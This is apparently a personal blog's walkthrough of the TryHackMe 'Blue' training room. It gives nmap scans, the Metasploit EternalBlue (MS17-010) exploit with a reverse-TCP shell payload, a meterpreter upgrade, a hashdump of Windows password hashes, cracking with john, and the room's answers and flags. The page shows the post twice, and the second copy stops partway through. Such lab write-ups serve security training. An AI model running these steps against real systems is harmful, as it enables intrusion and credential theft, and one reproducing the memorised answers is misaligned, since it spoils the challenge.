<!DOCTYPE html>
<html lang="en">
  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="This is my personal website. The purpose of the Website is to assist and monitor my own development.">
<meta name="google-site-verification" content="NeMnHGyDeeJqt9s_pg03TI1foYUOvLwrHreqLj_mgRE">
<meta name="language" content="en">

<!-- css -->
<link rel="shortcut icon" href="/assets/img/favicon.ico" type="ico">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



<title>TryHackMe - Blue - Mr0Wido's Blog</title>



<!-- Script -->
<script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
<script src="https://kit.fontawesome.com/d54796acd1.js" crossorigin="anonymous"></script>





    <title>TryHackMe - Blue - Mr0Wido's Blog</title>
    <link rel="stylesheet" type="text/css" href="/assets/css/main.css">
  </head>
  <body>
    <header class="site-header">
  <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
  <div class="site-title">
    <a href="http://localhost:4000">Mr0Wido's Blog</a>
  </div>
  <nav class="site-nav">
    <ul class="site-nav__list">
      <li class="site-nav__item">
        <a class="site-nav__link " href="/">Home</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/whoami/">Whoami</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/posts/">Posts</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/projects/">Projects</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/cv/">CV</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/categories/">Categories</a>
      </li>
      <li class="site-nav__item">
        <div class="search">
          <input type="text" id="search-input" placeholder="Search...">
          <i class="fas fa-search"></i>
          <ul id="results-container"></ul>
        </div>
      </li>
    </ul>
  </nav>
</header>


<!-- 360 to 980 -->
<header class="header-mobile">
  <div class="header-inner clearfix">
    <div class="nav-btn nav-slider">
      <i class="fa-solid fa-bars"></i>
    </div>
    <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
    <div class="site-title">
      <a href="http://localhost:4000">Mr0Wido's Blog</a>
    </div>
  </div>
</header>
<nav class="sidebar">
  <div class="nav-header">
    <div class="nav-search">
      <div class="search">
        <i class="fas fa-search"></i>
        <input type="search" name="search" id="search-input" placeholder="Search...">
        <ul id="results-container"></ul>
      </div>
    </div>
  </div>
  <ul class="nav-categories ul-base">
    <li><a class="site-nav__link " href="/">Home</a></li>
    <li><a class="site-nav__link " href="/whoami/">Whoami</a></li>
    <li><a class="site-nav__link " href="/posts/">Posts</a></li>
    <li><a class="site-nav__link " href="/projects/">Projects</a></li>
    <li><a class="site-nav__link " href="/cv/">CV</a></li>
    <li><a class="site-nav__link " href="/categories/">Categories</a></li>
  </ul>
  <ul class="social ul-base">
    <li><a href="https://twitter.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i></a></li>
    <li><a href="https://instagram.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i></a></li>
    <li><a href="https://www.linkedin.com/in/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a></li>
    <li><a href="https://github.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i></a></li>
  </ul>
  <div class="copyright">
    <span> © Copyright 2023 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a></span>
  </div>
</nav>
<div class="overlay"></div>
    
    <div class="container-default">
      <div class="content-container">
        <main class="default">
          <div class="post">
  <h1 class="post__title">TryHackMe - Blue</h1>
  <div class="post__content">
    <p><br></p>

<h2 id="1-recon">1. Recon</h2>

<p>Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.</p>

<p><br></p>

<h3 id="11-how-many-ports-are-open-with-a-port-number-under-1000">1.1 How many ports are open with a port number under 1000?</h3>

<p>Let’s find out how many ports are open on the target with a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.173.132
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/nmap.png" alt="nmap"></p>

<p>As you can see, there are 3 ports under 1000. These are 135/tcp, 139/tcp, and 445/tcp.</p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">3</code></strong></p>

<p><br></p>

<h3 id="12-what-is-this-machine-vulnerable-to-answer-in-the-form-of-ms--ex-ms08-067">1.2 What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</h3>

<p>For more detailed information, let’s do a more detailed nmap scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV -A -O 10.10.173.132
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/nmap2.png" alt="nmap2"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	445/tcp   open  microsoft-ds   Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
</code></pre></div></div>

<p>Now, we’re searching in the browser, to see if we can find anything.</p>

<p><img src="/assets/img/tryhackme/blue/search.png" alt="search"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">MS17-010</code></strong></p>

<p><br></p>

<hr>

<p><br></p>

<h2 id="2-gain-access">2. Gain Access</h2>

<p>Exploit the machine and gain a foothold.</p>

<p><br></p>

<h3 id="21-find-the-exploitation-code-we-will-run-against-the-machine-what-is-the-full-path-of-the-code-ex-exploit">2.1 Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/……..)</h3>

<p><img src="/assets/img/tryhackme/blue/rapid.png" alt="rapid"></p>

<p>Now, let’s apply them to ourselves.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
msf6 &gt; show targets
msf6 &gt; set target 1
msf6 &gt; set payload windows/x64/shell/reverse_tcp
msf6 &gt; show options
msf6 &gt; set RHOSTS 10.10.173.132
msf6 &gt; set LHOST 10.8.86.168
msf6 &gt; exploit
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/set.png" alt="set"></p>

<p>And we are inside.</p>

<p><img src="/assets/img/tryhackme/blue/in.png" alt="in"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">exploit/windows/smb/ms17_010_eternalblue</code></strong></p>

<p><br></p>

<h3 id="22-show-options-and-set-the-one-required-value-what-is-the-name-of-this-value-all-caps-for-submission">2.2 Show options and set the one required value. What is the name of this value? (All caps for submission)</h3>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">RHOSTS</code></strong></p>

<p><br></p>

<hr>

<p><br></p>

<h2 id="3-escalate">3. Escalate</h2>

<p>Escalate privileges, learn how to upgrade shells in metasploit.</p>

<p><br></p>

<h3 id="31-if-you-havent-already-background-the-previously-gained-shell-ctrl--z-research-online-how-to-convert-a-shell-to-meterpreter-shell-in-metasploit-what-is-the-name-of-the-post-module-we-will-use-exact-path-similar-to-the-exploit-we-previously-selected">3.1 If you haven’t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</h3>

<p><em>Hint: shell_to_meterpreter</em></p>

<p>We put the session opened with CTRL+Z in the background.</p>

<p><img src="/assets/img/tryhackme/blue/ses.png" alt="ses"></p>

<p>We make a search using the hint.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; search shell_to_meterpreter
&gt; use 0
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/post.png" alt="post"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">post/multi/manage/shell_to_meterpreter</code></strong></p>

<p><br></p>

<h3 id="32-select-this-use-module_path-show-options-what-option-are-we-required-to-change">3.2 Select this (use MODULE_PATH). Show options, what option are we required to change?</h3>

<p>Now we have to configure which Session shell to upgrade meterpreter. We can see the Session by running the following command.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; sessions -l
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/l.png" alt="l"></p>

<p>Set the session-id according to your session. We can use the following command to configure the session.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; show options
&gt; set SESSION 1
</code></pre></div></div>
<p><img src="/assets/img/tryhackme/blue/id.png" alt="id"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">SESSION</code></strong></p>

<p><br></p>

<h3 id="33-exploit">3.3 Exploit</h3>

<p>After making the adjustments, we run it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; run
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/run.png" alt="run"></p>

<p>After the new session opened select the session and execute that session.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; sessions -l
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/ses2.png" alt="ses2"></p>

<p>Now execute the new session by running the following command.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; sessions -i 2
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/i2.png" alt="i2"></p>

<p>And we are inside.</p>

<p><br></p>

<hr>

<p><br></p>

<h2 id="4-cracking">4. Cracking</h2>

<p>Dump the non-default user’s password and crack it!</p>

<p><br></p>

<h3 id="41-within-our-elevated-meterpreter-shell-run-the-command-hashdump-this-will-dump-all-of-the-passwords-on-the-machine-as-long-as-we-have-the-correct-privileges-to-do-so-what-is-the-name-of-the-non-default-user">4.1 Within our elevated meterpreter shell, run the command ‘hashdump’. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; hashdump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/hashdump.png" alt="hashdump"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">jon</code></strong></p>

<p><br></p>

<h3 id="42-copy-this-password-hash-to-a-file-and-research-how-to-crack-it-what-is-the-cracked-password">4.2 Copy this password hash to a file and research how to crack it. What is the cracked password?</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashdump.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/john.png" alt="john"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">alqfna22</code></strong></p>

<p><br></p>

<hr>

<p><br></p>

<h2 id="5-find-flags">5. Find flags!</h2>

<p>Find the three flags planted on this machine. These are not traditional flags, rather, they’re meant to represent key locations within the Windows system. Use the hints provided below to complete this room!</p>

<p><br></p>

<h3 id="51-flag1-this-flag-can-be-found-at-the-system-root">5.1 Flag1? This flag can be found at the system root.</h3>

<p>Let’s move to the root directory to see how the file system looks like.</p>

<p><img src="/assets/img/tryhackme/blue/flag1.png" alt="flag1"></p>

<p>Our first flag is located at the root of C:\</p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">flag{access_the_machine}</code></strong></p>

<p><br></p>

<h3 id="52-flag2-this-flag-can-be-found-at-the-location-where-passwords-are-stored-within-windows">5.2 Flag2? This flag can be found at the location where passwords are stored within Windows.</h3>

<p>Let’s find out where the other flags are.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; shell
&gt; dir *flag* /s /b 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/shell.png" alt="shell"></p>

<p>Content of other flags.</p>

<p><img src="/assets/img/tryhackme/blue/flags.png" alt="flags"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">flag{sam_database_elevated_access}</code></strong></p>

<p><br></p>

<h3 id="53-flag3-this-flag-can-be-found-in-an-excellent-location-to-loot-after-all-administrators-usually-have-pretty-interesting-things-saved">5.3 flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.</h3>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">flag{admin_documents_can_be_valuable}</code></strong>
<br></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br></p>

  </div>
  <div class="post__footer">
    <p class="post__date">
      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 16, 2023</p>
    <div class="post__categories">
      
      
      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
            
    </div>      
    
    <div class="post__tags">
      <p class="post__tags-title">
        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
        <span class="post__tags-container">
          
          <span class="post__tags-item">windows,</span>
          
          <span class="post__tags-item">eternal blue,</span>
          
          <span class="post__tags-item">MS17-010</span>
          
        </span>
      </p>
    </div>
    
  </div>
</div>
<br>


<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    this.page.url = 'http://localhost:4000/tryhackme-blue/';
    this.page.identifier = '/tryhackme-blue';
    
    };

    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
</noscript>



        </main>
      </div>
      <div class="author-container">
        


<div itemscope itemtype="https://schema.org/Person" class="author-card">

  
    <div class="author__avatar">
        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
    </div>
  
  <div class="author__content-head">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>

        </div>
      
    </div>
  
    <div class="author__urls-wrapper">
      <ul class="author__urls social-icons">
        
          
            
              <li><a href="http://localhost:4000/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
            
          
            
              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
            
          
            
              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
            
          
            
              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
            
          
            
              <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
            
          
        
  
        
  
        
          <li>
            <a href="mailto:furkn.dniz@gmail.com" rel="me" class="u-email">
              <meta itemprop="email" content="furkn.dniz@gmail.com">
              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
            </a>
          </li>
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
      </ul>
    </div>
  </div>
  <div class="author__content-head-medium">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>

        </div>
      
      <div class="author__urls-wrapper">
        <ul class="author__urls social-icons">
          
            
              
                <li><a href="http://localhost:4000/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
              
            
              
                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
              
            
              
                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
              
            
              
                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
              
            
              
                <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
              
            
          
    
          
    
          
            <li>
              <a href="mailto:furkn.dniz@gmail.com" rel="me" class="u-email">
                <meta itemprop="email" content="furkn.dniz@gmail.com">
                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
              </a>
            </li>
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
        </ul>
      </div>
    </div>
  

  </div>
</div>

      </div>
    </div>

    <div class="container-medium">
      <div class="author-container">
        


<div itemscope itemtype="https://schema.org/Person" class="author-card">

  
    <div class="author__avatar">
        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
    </div>
  
  <div class="author__content-head">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>

        </div>
      
    </div>
  
    <div class="author__urls-wrapper">
      <ul class="author__urls social-icons">
        
          
            
              <li><a href="http://localhost:4000/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
            
          
            
              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
            
          
            
              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
            
          
            
              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
            
          
            
              <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
            
          
        
  
        
  
        
          <li>
            <a href="mailto:furkn.dniz@gmail.com" rel="me" class="u-email">
              <meta itemprop="email" content="furkn.dniz@gmail.com">
              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
            </a>
          </li>
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
      </ul>
    </div>
  </div>
  <div class="author__content-head-medium">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>

        </div>
      
      <div class="author__urls-wrapper">
        <ul class="author__urls social-icons">
          
            
              
                <li><a href="http://localhost:4000/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
              
            
              
                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
              
            
              
                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
              
            
              
                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
              
            
              
                <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
              
            
          
    
          
    
          
            <li>
              <a href="mailto:furkn.dniz@gmail.com" rel="me" class="u-email">
                <meta itemprop="email" content="furkn.dniz@gmail.com">
                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
              </a>
            </li>
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
        </ul>
      </div>
    </div>
  

  </div>
</div>

      </div>
      <div class="content-container">
        <main class="default">
          <div class="post">
  <h1 class="post__title">TryHackMe - Blue</h1>
  <div class="post__content">
    <p><br></p>

<h2 id="1-recon">1. Recon</h2>

<p>Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.</p>

<p><br></p>

<h3 id="11-how-many-ports-are-open-with-a-port-number-under-1000">1.1 How many ports are open with a port number under 1000?</h3>

<p>Let’s find out how many ports are open on the target with a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.173.132
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/nmap.png" alt="nmap"></p>

<p>As you can see, there are 3 ports under 1000. These are 135/tcp, 139/tcp, and 445/tcp.</p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">3</code></strong></p>

<p><br></p>

<h3 id="12-what-is-this-machine-vulnerable-to-answer-in-the-form-of-ms--ex-ms08-067">1.2 What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</h3>

<p>For more detailed information, let’s do a more detailed nmap scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV -A -O 10.10.173.132
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/nmap2.png" alt="nmap2"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	445/tcp   open  microsoft-ds   Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
</code></pre></div></div>

<p>Now, we’re searching in the browser, to see if we can find anything.</p>

<p><img src="/assets/img/tryhackme/blue/search.png" alt="search"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">MS17-010</code></strong></p>

<p><br></p>

<hr>

<p><br></p>

<h2 id="2-gain-access">2. Gain Access</h2>

<p>Exploit the machine and gain a foothold.</p>

<p><br></p>

<h3 id="21-find-the-exploitation-code-we-will-run-against-the-machine-what-is-the-full-path-of-the-code-ex-exploit">2.1 Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/……..)</h3>

<p><img src="/assets/img/tryhackme/blue/rapid.png" alt="rapid"></p>

<p>Now, let’s apply them to ourselves.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
msf6 &gt; show targets
msf6 &gt; set target 1
msf6 &gt; set payload windows/x64/shell/reverse_tcp
msf6 &gt; show options
msf6 &gt; set RHOSTS 10.10.173.132
msf6 &gt; set LHOST 10.8.86.168
msf6 &gt; exploit
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/set.png" alt="set"></p>

<p>And we are inside.</p>

<p><img src="/assets/img/tryhackme/blue/in.png" alt="in"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">exploit/windows/smb/ms17_010_eternalblue</code></strong></p>

<p><br></p>

<h3 id="22-show-options-and-set-the-one-required-value-what-is-the-name-of-this-value-all-caps-for-submission">2.2 Show options and set the one required value. What is the name of this value? (All caps for submission)</h3>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">RHOSTS</code></strong></p>

<p><br></p>

<hr>

<p><br></p>

<h2 id="3-escalate">3. Escalate</h2>

<p>Escalate privileges, learn how to upgrade shells in metasploit.</p>

<p><br></p>

<h3 id="31-if-you-havent-already-background-the-previously-gained-shell-ctrl--z-research-online-how-to-convert-a-shell-to-meterpreter-shell-in-metasploit-what-is-the-name-of-the-post-module-we-will-use-exact-path-similar-to-the-exploit-we-previously-selected">3.1 If you haven’t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</h3>

<p><em>Hint: shell_to_meterpreter</em></p>

<p>We put the session opened with CTRL+Z in the background.</p>

<p><img src="/assets/img/tryhackme/blue/ses.png" alt="ses"></p>

<p>We make a search using the hint.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; search shell_to_meterpreter
&gt; use 0
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/post.png" alt="post"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">post/multi/manage/shell_to_meterpreter</code></strong></p>

<p><br></p>

<h3 id="32-select-this-use-module_path-show-options-what-option-are-we-required-to-change">3.2 Select this (use MODULE_PATH). Show options, what option are we required to change?</h3>

<p>Now we have to configure which Session shell to upgrade meterpreter. We can see the Session by running the following command.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; sessions -l
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/l.png" alt="l"></p>

<p>Set the session-id according to your session. We can use the following command to configure the session.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; show options
&gt; set SESSION 1
</code></pre></div></div>
<p><img src="/assets/img/tryhackme/blue/id.png" alt="id"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">SESSION</code></strong></p>

<p><br></p>

<h3 id="33-exploit">3.3 Exploit</h3>

<p>After making the adjustments, we run it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; run
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/run.png" alt="run"></p>

<p>After the new session opened select the session and execute that session.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; sessions -l
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/ses2.png" alt="ses2"></p>

<p>Now execute the new session by running the following command.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; sessions -i 2
</code></pre></div></div>

